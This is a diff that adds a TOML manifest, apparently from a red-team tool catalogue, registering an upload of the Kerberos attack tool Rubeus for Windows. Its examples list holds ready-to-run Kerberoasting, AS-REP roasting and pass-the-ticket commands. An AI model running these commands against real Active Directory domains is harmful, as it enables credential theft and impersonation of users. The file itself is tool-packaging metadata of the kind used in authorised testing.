@@ -1,0 +1,17 @@
+schema = 1
+kind = "upload"
+description = "Kerberos enumeration, roasting, delegation and ticket operations for Windows"
+tags = ["ad", "kerberos", "roasting", "windows"]
+upstream = "https://github.com/GhostPack/Rubeus"
+licence = "BSD-3-Clause"
+arch = "x86_64"
+examples = [
+  ".\\Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap",
+  ".\\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap",
+  ".\\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt",
+]
+
+[[upload]]
+path = "files/Rubeus.exe"
+as = "Rubeus.exe"
+note = ".NET 4.0, AnyCPU; deterministic build from the pinned official source"
